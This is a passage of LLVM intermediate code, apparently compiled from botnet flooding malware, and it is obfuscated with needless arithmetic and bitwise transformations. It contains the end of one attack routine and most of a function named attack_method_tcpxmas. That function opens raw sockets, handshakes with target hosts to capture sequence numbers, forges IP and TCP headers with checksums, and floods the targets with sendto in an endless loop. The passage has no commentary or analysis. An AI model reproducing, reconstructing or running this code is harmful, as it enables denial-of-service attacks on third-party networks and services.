  %602 = xor i16 1, -1
  %603 = xor i16 %598, %602
  %604 = and i16 %603, %598
  %605 = and i16 %598, 1
  %606 = shl i16 %604, 10
  %607 = xor i16 -1025, -1
  %608 = xor i16 %601, %607
  %609 = and i16 %608, %601
  %610 = and i16 %601, -1025
  %611 = and i16 %609, %606
  %612 = xor i16 %609, %606
  %613 = or i16 %611, %612
  %614 = or i16 %609, %606
  store i16 %613, i16* %600, align 4
  %615 = load i8, i8* %22, align 1
  %616 = sext i8 %615 to i16
  %617 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %618 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %617, i32 0, i32 4
  %619 = load i16, i16* %618, align 4
  %620 = xor i16 1, -1
  %621 = xor i16 %616, %620
  %622 = and i16 %621, %616
  %623 = and i16 %616, 1
  %624 = shl i16 %622, 9
  %625 = xor i16 %619, -1
  %626 = xor i16 -513, -1
  %627 = xor i16 16440, -1
  %628 = or i16 %625, %626
  %629 = or i16 16440, %627
  %630 = xor i16 %628, -1
  %631 = and i16 %630, %629
  %632 = and i16 %619, -513
  %633 = and i16 %631, %624
  %634 = xor i16 %631, %624
  %635 = or i16 %633, %634
  %636 = or i16 %631, %624
  store i16 %635, i16* %618, align 4
  %637 = load i8, i8* %23, align 1
  %638 = sext i8 %637 to i16
  %639 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %640 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %639, i32 0, i32 4
  %641 = load i16, i16* %640, align 4
  %642 = xor i16 %638, -1
  %643 = xor i16 1, -1
  %644 = xor i16 20101, -1
  %645 = or i16 %642, %643
  %646 = or i16 20101, %644
  %647 = xor i16 %645, -1
  %648 = and i16 %647, %646
  %649 = and i16 %638, 1
  %650 = shl i16 %648, 8
  %651 = xor i16 -257, -1
  %652 = xor i16 %641, %651
  %653 = and i16 %652, %641
  %654 = and i16 %641, -257
  %655 = and i16 %653, %650
  %656 = xor i16 %653, %650
  %657 = or i16 %655, %656
  %658 = or i16 %653, %650
  store i16 %657, i16* %640, align 4
  %659 = load i8*, i8** %38, align 8
  %660 = load i32, i32* %24, align 4
  call void @rand_str(i8* %659, i32 %660)
  br label %705

; <label>:661:                                    ; preds = %254, %239
  %662 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %663 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %662, i32 0, i32 4
  %664 = load i16, i16* %663, align 4
  %665 = lshr i16 %664, 8
  %666 = xor i16 1, -1
  %667 = xor i16 %665, %666
  %668 = and i16 %667, %665
  %669 = and i16 %665, 1
  %670 = zext i16 %668 to i32
  %671 = icmp ne i32 %670, 0
  br i1 %671, label %687, label %672

; <label>:672:                                    ; preds = %661
  %673 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %674 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %673, i32 0, i32 4
  %675 = load i16, i16* %674, align 4
  %676 = lshr i16 %675, 10
  %677 = xor i16 %676, -1
  %678 = xor i16 1, -1
  %679 = xor i16 -16765, -1
  %680 = or i16 %677, %678
  %681 = or i16 -16765, %679
  %682 = xor i16 %680, -1
  %683 = and i16 %682, %681
  %684 = and i16 %676, 1
  %685 = zext i16 %683 to i32
  %686 = icmp ne i32 %685, 0
  br i1 %686, label %687, label %690

; <label>:687:                                    ; preds = %672, %661
  %688 = load i32, i32* %26, align 4
  %689 = call i32 @close(i32 %688)
  br label %121

; <label>:690:                                    ; preds = %672
  br label %691

; <label>:691:                                    ; preds = %690
  br label %692

; <label>:692:                                    ; preds = %691, %227
  br label %693

; <label>:693:                                    ; preds = %692, %223, %215
  %694 = call i64 @time(i64* null) #6
  %695 = load i64, i64* %31, align 8
  %696 = add i64 %694, 2910677761811298736
  %697 = sub i64 %696, %695
  %698 = sub i64 %697, 2910677761811298736
  %699 = sub nsw i64 %694, %695
  %700 = icmp sgt i64 %698, 10
  br i1 %700, label %701, label %704

; <label>:701:                                    ; preds = %693
  %702 = load i32, i32* %26, align 4
  %703 = call i32 @close(i32 %702)
  br label %121

; <label>:704:                                    ; preds = %693
  br label %203

; <label>:705:                                    ; preds = %392
  br label %706

; <label>:706:                                    ; preds = %705, %124
  %707 = load i32, i32* %9, align 4
  %708 = sub i32 0, 1
  %709 = sub i32 %707, %708
  %710 = add nsw i32 %707, 1
  store i32 %709, i32* %9, align 4
  br label %115

; <label>:711:                                    ; preds = %115
  br label %712

; <label>:712:                                    ; preds = %844, %711
  store i32 0, i32* %9, align 4
  br label %713

; <label>:713:                                    ; preds = %838, %712
  %714 = load i32, i32* %9, align 4
  %715 = load i8, i8* %5, align 1
  %716 = zext i8 %715 to i32
  %717 = icmp slt i32 %714, %716
  br i1 %717, label %718, label %844

; <label>:718:                                    ; preds = %713
  %719 = load i8**, i8*** %12, align 8
  %720 = load i32, i32* %9, align 4
  %721 = sext i32 %720 to i64
  %722 = getelementptr inbounds i8*, i8** %719, i64 %721
  %723 = load i8*, i8** %722, align 8
  store i8* %723, i8** %39, align 8
  %724 = load i8*, i8** %39, align 8
  %725 = bitcast i8* %724 to %struct.iphdr*
  store %struct.iphdr* %725, %struct.iphdr** %40, align 8
  %726 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %727 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %726, i64 1
  %728 = bitcast %struct.iphdr* %727 to %struct.tcphdr*
  store %struct.tcphdr* %728, %struct.tcphdr** %41, align 8
  %729 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %730 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %729, i64 1
  %731 = bitcast %struct.tcphdr* %730 to i8*
  store i8* %731, i8** %42, align 8
  %732 = load i16, i16* %14, align 2
  %733 = zext i16 %732 to i32
  %734 = icmp eq i32 %733, 65535
  br i1 %734, label %735, label %748

; <label>:735:                                    ; preds = %718
  %736 = call i32 @rand_next()
  %737 = xor i32 %736, -1
  %738 = xor i32 65535, -1
  %739 = xor i32 695406520, -1
  %740 = or i32 %737, %738
  %741 = or i32 695406520, %739
  %742 = xor i32 %740, -1
  %743 = and i32 %742, %741
  %744 = and i32 %736, 65535
  %745 = trunc i32 %743 to i16
  %746 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %747 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %746, i32 0, i32 3
  store i16 %745, i16* %747, align 4
  br label %748

; <label>:748:                                    ; preds = %735, %718
  %749 = load i8, i8* %25, align 1
  %750 = icmp ne i8 %749, 0
  br i1 %750, label %751, label %754

; <label>:751:                                    ; preds = %748
  %752 = load i8*, i8** %42, align 8
  %753 = load i32, i32* %24, align 4
  call void @rand_str(i8* %752, i32 %753)
  br label %754

; <label>:754:                                    ; preds = %751, %748
  %755 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %756 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %755, i32 0, i32 7
  store i16 0, i16* %756, align 2
  %757 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %758 = bitcast %struct.iphdr* %757 to i16*
  %759 = call zeroext i16 @checksum_generic(i16* %758, i32 20)
  %760 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %761 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %760, i32 0, i32 7
  store i16 %759, i16* %761, align 2
  %762 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %763 = load i32, i32* %9, align 4
  %764 = sext i32 %763 to i64
  %765 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %762, i64 %764
  %766 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %765, i32 0, i32 1
  %767 = load i32, i32* %766, align 4
  %768 = add i32 %767, -1403268945
  %769 = add i32 %768, 1
  %770 = sub i32 %769, -1403268945
  %771 = add i32 %767, 1
  store i32 %770, i32* %766, align 4
  %772 = trunc i32 %767 to i16
  %773 = call zeroext i16 @htons(i16 zeroext %772) #7
  %774 = zext i16 %773 to i32
  %775 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %776 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %775, i32 0, i32 2
  store i32 %774, i32* %776, align 4
  %777 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %778 = load i32, i32* %9, align 4
  %779 = sext i32 %778 to i64
  %780 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %777, i64 %779
  %781 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %780, i32 0, i32 2
  %782 = load i32, i32* %781, align 4
  %783 = trunc i32 %782 to i16
  %784 = call zeroext i16 @htons(i16 zeroext %783) #7
  %785 = zext i16 %784 to i32
  %786 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %787 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %786, i32 0, i32 3
  store i32 %785, i32* %787, align 4
  %788 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %789 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %788, i32 0, i32 6
  store i16 0, i16* %789, align 4
  %790 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %791 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %792 = bitcast %struct.tcphdr* %791 to i8*
  %793 = load i32, i32* %24, align 4
  %794 = sext i32 %793 to i64
  %795 = sub i64 0, 20
  %796 = sub i64 0, %794
  %797 = add i64 %795, %796
  %798 = sub i64 0, %797
  %799 = add i64 20, %794
  %800 = trunc i64 %798 to i16
  %801 = call zeroext i16 @htons(i16 zeroext %800) #7
  %802 = load i32, i32* %24, align 4
  %803 = sext i32 %802 to i64
  %804 = add i64 20, -5359586351741902405
  %805 = add i64 %804, %803
  %806 = sub i64 %805, -5359586351741902405
  %807 = add i64 20, %803
  %808 = trunc i64 %806 to i32
  %809 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %790, i8* %792, i16 zeroext %801, i32 %808)
  %810 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %811 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %810, i32 0, i32 6
  store i16 %809, i16* %811, align 4
  %812 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %813 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %812, i32 0, i32 1
  %814 = load i16, i16* %813, align 2
  %815 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %816 = load i32, i32* %9, align 4
  %817 = sext i32 %816 to i64
  %818 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %815, i64 %817
  %819 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %818, i32 0, i32 0
  %820 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %819, i32 0, i32 1
  store i16 %814, i16* %820, align 2
  %821 = load i32, i32* %10, align 4
  %822 = load i8*, i8** %39, align 8
  %823 = load i32, i32* %24, align 4
  %824 = sext i32 %823 to i64
  %825 = sub i64 0, %824
  %826 = sub i64 40, %825
  %827 = add i64 40, %824
  %828 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %829 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %830 = load i32, i32* %9, align 4
  %831 = sext i32 %830 to i64
  %832 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %829, i64 %831
  %833 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %832, i32 0, i32 0
  %834 = bitcast %struct.sockaddr_in* %833 to %struct.sockaddr*
  store %struct.sockaddr* %834, %struct.sockaddr** %828, align 8
  %835 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %836 = load %struct.sockaddr*, %struct.sockaddr** %835, align 8
  %837 = call i64 @sendto(i32 %821, i8* %822, i64 %826, i32 16384, %struct.sockaddr* %836, i32 16)
  br label %838

; <label>:838:                                    ; preds = %754
  %839 = load i32, i32* %9, align 4
  %840 = add i32 %839, -1403374844
  %841 = add i32 %840, 1
  %842 = sub i32 %841, -1403374844
  %843 = add nsw i32 %839, 1
  store i32 %842, i32* %9, align 4
  br label %713

; <label>:844:                                    ; preds = %713
  br label %712

; <label>:845:                                    ; preds = %214, %111, %105
  ret void
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpxmas(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_stomp_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 16) #6
  %47 = bitcast i8* %46 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %47, %struct.attack_stomp_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 %49, i64 8) #6
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 2, i32 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 3, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 4, i32 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 5, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 11, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 12, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 13, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 14, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 15, i32 1)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 16, i32 1)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 0, i32 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 1, i32 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %103, i32* %10, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %4
  br label %854

; <label>:106:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %107 = load i32, i32* %10, align 4
  %108 = bitcast i32* %9 to i8*
  %109 = call i32 @setsockopt(i32 %107, i32 0, i32 3, i8* %108, i32 4) #6
  %110 = icmp eq i32 %109, -1
  br i1 %110, label %111, label %114

; <label>:111:                                    ; preds = %106
  %112 = load i32, i32* %10, align 4
  %113 = call i32 @close(i32 %112)
  br label %854

; <label>:114:                                    ; preds = %106
  store i32 0, i32* %9, align 4
  br label %115

; <label>:115:                                    ; preds = %717, %114
  %116 = load i32, i32* %9, align 4
  %117 = load i8, i8* %5, align 1
  %118 = zext i8 %117 to i32
  %119 = icmp slt i32 %116, %118
  br i1 %119, label %120, label %723

; <label>:120:                                    ; preds = %115
  br label %121

; <label>:121:                                    ; preds = %712, %698, %120
  %122 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %122, i32* %26, align 4
  %123 = icmp eq i32 %122, -1
  br i1 %123, label %124, label %125

; <label>:124:                                    ; preds = %121
  br label %717

; <label>:125:                                    ; preds = %121
  %126 = load i32, i32* %26, align 4
  %127 = load i32, i32* %26, align 4
  %128 = call i32 (i32, i32, ...) @fcntl(i32 %127, i32 3, i32 0)
  %129 = and i32 %128, 2048
  %130 = xor i32 %128, 2048
  %131 = or i32 %129, %130
  %132 = or i32 %128, 2048
  %133 = call i32 (i32, i32, ...) @fcntl(i32 %126, i32 4, i32 %131)
  %134 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %134, align 4
  %135 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %136 = load i32, i32* %9, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %135, i64 %137
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %138, i32 0, i32 2
  %140 = load i8, i8* %139, align 4
  %141 = zext i8 %140 to i32
  %142 = icmp slt i32 %141, 32
  br i1 %142, label %143, label %167

; <label>:143:                                    ; preds = %125
  %144 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %145 = load i32, i32* %9, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i64 %146
  %148 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i32 0, i32 1
  %149 = load i32, i32* %148, align 4
  %150 = call i32 @ntohl(i32 %149) #7
  %151 = call i32 @rand_next()
  %152 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %153 = load i32, i32* %9, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i64 %154
  %156 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %155, i32 0, i32 2
  %157 = load i8, i8* %156, align 4
  %158 = zext i8 %157 to i32
  %159 = lshr i32 %151, %158
  %160 = sub i32 %150, 2134787235
  %161 = add i32 %160, %159
  %162 = add i32 %161, 2134787235
  %163 = add i32 %150, %159
  %164 = call i32 @htonl(i32 %162) #7
  %165 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %166 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %165, i32 0, i32 0
  store i32 %164, i32* %166, align 4
  br label %176

; <label>:167:                                    ; preds = %125
  %168 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %169 = load i32, i32* %9, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %168, i64 %170
  %172 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %171, i32 0, i32 1
  %173 = load i32, i32* %172, align 4
  %174 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %175 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %174, i32 0, i32 0
  store i32 %173, i32* %175, align 4
  br label %176

; <label>:176:                                    ; preds = %167, %143
  %177 = load i16, i16* %17, align 2
  %178 = zext i16 %177 to i32
  %179 = icmp eq i32 %178, 65535
  br i1 %179, label %180, label %188

; <label>:180:                                    ; preds = %176
  %181 = call i32 @rand_next()
  %182 = xor i32 65535, -1
  %183 = xor i32 %181, %182
  %184 = and i32 %183, %181
  %185 = and i32 %181, 65535
  %186 = trunc i32 %184 to i16
  %187 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %186, i16* %187, align 2
  br label %192

; <label>:188:                                    ; preds = %176
  %189 = load i16, i16* %17, align 2
  %190 = call zeroext i16 @htons(i16 zeroext %189) #7
  %191 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %190, i16* %191, align 2
  br label %192

; <label>:192:                                    ; preds = %188, %180
  %193 = load i32, i32* %26, align 4
  %194 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %195 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %195, %struct.sockaddr** %194, align 8
  %196 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %197 = load %struct.sockaddr*, %struct.sockaddr** %196, align 8
  %198 = call i32 @connect(i32 %193, %struct.sockaddr* %197, i32 16)
  %199 = call i64 @time(i64* null) #6
  store i64 %199, i64* %31, align 8
  br label %200

; <label>:200:                                    ; preds = %715, %192
  store i32 16, i32* %29, align 4
  %201 = load i32, i32* %10, align 4
  %202 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %203 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %204 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %204, %struct.sockaddr** %203, align 8
  %205 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %206 = load %struct.sockaddr*, %struct.sockaddr** %205, align 8
  %207 = call i64 @recvfrom(i32 %201, i8* %202, i64 256, i32 16384, %struct.sockaddr* %206, i32* %29)
  %208 = trunc i64 %207 to i32
  store i32 %208, i32* %33, align 4
  %209 = load i32, i32* %33, align 4
  %210 = icmp eq i32 %209, -1
  br i1 %210, label %211, label %212

; <label>:211:                                    ; preds = %200
  br label %854

; <label>:212:                                    ; preds = %200
  %213 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %214 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %213, i32 0, i32 0
  %215 = load i32, i32* %214, align 4
  %216 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %217 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %216, i32 0, i32 0
  %218 = load i32, i32* %217, align 4
  %219 = icmp eq i32 %215, %218
  br i1 %219, label %220, label %704

; <label>:220:                                    ; preds = %212
  %221 = load i32, i32* %33, align 4
  %222 = sext i32 %221 to i64
  %223 = icmp ugt i64 %222, 40
  br i1 %223, label %224, label %704

; <label>:224:                                    ; preds = %220
  %225 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %226 = getelementptr inbounds i8, i8* %225, i64 20
  %227 = bitcast i8* %226 to %struct.tcphdr*
  store %struct.tcphdr* %227, %struct.tcphdr** %35, align 8
  %228 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %229 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %228, i32 0, i32 0
  %230 = load i16, i16* %229, align 4
  %231 = zext i16 %230 to i32
  %232 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %233 = load i16, i16* %232, align 2
  %234 = zext i16 %233 to i32
  %235 = icmp eq i32 %231, %234
  br i1 %235, label %236, label %703

; <label>:236:                                    ; preds = %224
  %237 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %238 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %237, i32 0, i32 4
  %239 = load i16, i16* %238, align 4
  %240 = lshr i16 %239, 9
  %241 = xor i16 1, -1
  %242 = xor i16 %240, %241
  %243 = and i16 %242, %240
  %244 = and i16 %240, 1
  %245 = zext i16 %243 to i32
  %246 = icmp ne i32 %245, 0
  br i1 %246, label %247, label %668

; <label>:247:                                    ; preds = %236
  %248 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %249 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %248, i32 0, i32 4
  %250 = load i16, i16* %249, align 4
  %251 = lshr i16 %250, 12
  %252 = xor i16 1, -1
  %253 = xor i16 %251, %252
  %254 = and i16 %253, %251
  %255 = and i16 %251, 1
  %256 = zext i16 %254 to i32
  %257 = icmp ne i32 %256, 0
  br i1 %257, label %258, label %668

; <label>:258:                                    ; preds = %247
  %259 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %260 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %259, i32 0, i32 0
  %261 = load i32, i32* %260, align 4
  %262 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %263 = load i32, i32* %9, align 4
  %264 = sext i32 %263 to i64
  %265 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %262, i64 %264
  %266 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %265, i32 0, i32 0
  store i32 %261, i32* %266, align 4
  %267 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %268 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %267, i32 0, i32 2
  %269 = load i32, i32* %268, align 4
  %270 = call i32 @ntohl(i32 %269) #7
  %271 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %272 = load i32, i32* %9, align 4
  %273 = sext i32 %272 to i64
  %274 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %271, i64 %273
  %275 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %274, i32 0, i32 1
  store i32 %270, i32* %275, align 4
  %276 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %277 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %276, i32 0, i32 3
  %278 = load i32, i32* %277, align 4
  %279 = call i32 @ntohl(i32 %278) #7
  %280 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %281 = load i32, i32* %9, align 4
  %282 = sext i32 %281 to i64
  %283 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %280, i64 %282
  %284 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %283, i32 0, i32 2
  store i32 %279, i32* %284, align 4
  %285 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %286 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %285, i32 0, i32 1
  %287 = load i16, i16* %286, align 2
